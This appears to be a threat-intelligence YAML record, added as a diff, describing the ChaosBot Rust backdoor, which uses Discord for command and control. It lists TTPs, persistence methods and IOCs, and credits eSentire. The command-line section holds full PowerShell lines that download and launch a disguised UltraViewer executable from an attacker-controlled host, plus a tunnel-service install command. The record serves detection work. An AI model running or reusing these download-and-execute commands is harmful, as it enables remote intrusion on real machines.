@@ -1,0 +1,72 @@
+description: A Rust-based backdoor, ChaosBot, leveraging Discord for C2 and using
+  PowerShell to execute commands.
+attribution: ChaosBot operators (Discord user chaos_00019)
+malware_families:
+- ChaosBot
+TTPs:
+  processes: []
+  commandline:
+  - powershell -Command "$OutputEncoding = [System.Text.Encoding]::UTF8; <SOME_COMMAND>"
+  - c:\\users\\public\\music\\node.exe -c c:\\users\\public\\music\\node.ini
+  - c:\\users\\public\\music\\code.exeshell(echo | c:\\users\\public\\music\\code.exe
+    tunnel service install > c:\\users\\public\\music\\log)
+  - '"powershell.exe" -ExecutionPolicy Bypass -NoProfile -Command "$localPath = (Get-Location).Path;Start-Sleep
+    -Milliseconds 568;Remove-Item -Path \"$localPath\\2557.KV6-TTKQ.pdf\" -Force;Invoke-WebRequest
+    -Uri \"https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/2557.KV6-TTKQ.pdf\"
+    -OutFile $localPath\\2557.KV6-TTKQ.pdf;Invoke-Item \"$localPath\\2557.KV6-TTKQ.pdf\";if
+    (-not (Test-Path \"C:\\Users\\Public\\videos\\Ultraviewer\")){ New-Item -Type
+    Directory C:\\Users\\Public\\videos\\Ultraviewer -Force | Out-Null };Invoke-WebRequest
+    -Uri https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/UltraViever.2ipTM
+    -OutFile C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.exe;Expand-Archive
+    -Path \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.zip\" -DestinationPath
+    C:\\Users\\Public\\videos\\Ultraviewer -Force;Remove-Item \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.zip\"
+    -Force;Invoke-Item \"C:\\Users\\Public\\videos\\Ultraviewer\\UltraViewer.exe\"'
+  powershell:
+  - $OutputEncoding = [System.Text.Encoding]::UTF8; <SOME_COMMAND>
+  - Invoke-WebRequest -Uri "https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/2557.KV6-TTKQ.pdf"
+    -OutFile $localPath\2557.KV6-TTKQ.pdf
+  - Invoke-WebRequest -Uri https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/UltraViever.2ipTM
+    -OutFile C:\Users\Public\videos\Ultraviewer\UltraViewer.exe
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: powershell.exe
+    destination: usbcard.s3.dualstack.us-east-1.amazonaws.con
+    port: 443
+  - process: powershell.exe
+    destination: discord.com
+    port: 443
+  file_activity:
+  - C:\\Users\\Public\\Libraries\\msedge_elf.dll
+  - c:\\users\\public\\music\\node.exe
+  - c:\\users\\public\\music\\node.ini
+  - c:\\users\\public\\music\\code.exe
+  - c:\\users\\public\\music\\log
+  - C:\Users\Public\videos\Ultraviewer\UltraViewer.zip
+  - C:\Users\Public\videos\Ultraviewer\UltraViewer.exe
+  - $localPath\2557.KV6-TTKQ.pdf
+  persistence:
+  - Side-loaded msedge_elf.dll via identity_helper.exe
+  - WMI remote execution using compromised credentials
+  process_relations: []
+IOCs:
+  hashes:
+  - 90f16e9dd3d919a4e6173219a1561ab04607a490567da736fa2ab0180d6fffbb
+  - f764ff0750aab9f2fc4cd9ec90c58f1fc85ac74330fc623104d42dfaaf825103
+  ips:
+  - 18.162.110.113
+  domains:
+  - discord.com
+  urls:
+  - hxxps://cdn.discordapp[.]com/attachments/1418576301236686928/1419510506380722229/node.exe?ex=68d205ad&is=68d0b42d&hm=12fc1ef2525834019505a2830ae2c200d0a2f37c34e9a141ee2488751c42a377
+  - hxxps://cdn.discordapp[.]com/attachments/1418576301236686928/1419510525158621295/node?ex=68d205b2&is=68d0b432&hm=f8f4d85c862efec8b1b9f9a519da1f3472070fd3a171aca4936a9d037965374b
+  - hxxps://transferai-all.s3.dualstack.ap-southeast-1.amazonaws[.]com/app/index/code.exe
+  - https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/2557.KV6-TTKQ.pdf
+  - https://usbcard.s3.dualstack.us-east-1.amazonaws.con/test/UltraViever.2ipTM
+  - discord.com
+authors:
+- eSentire Threat Response Unit (TRU)
+reference: https://www.esentire.com/blog/new-rust-malware-chaosbot-uses-discord-for-command-and-control
+date_of_publication: October 9, 2025
+file_creation_date: October 10, 2025
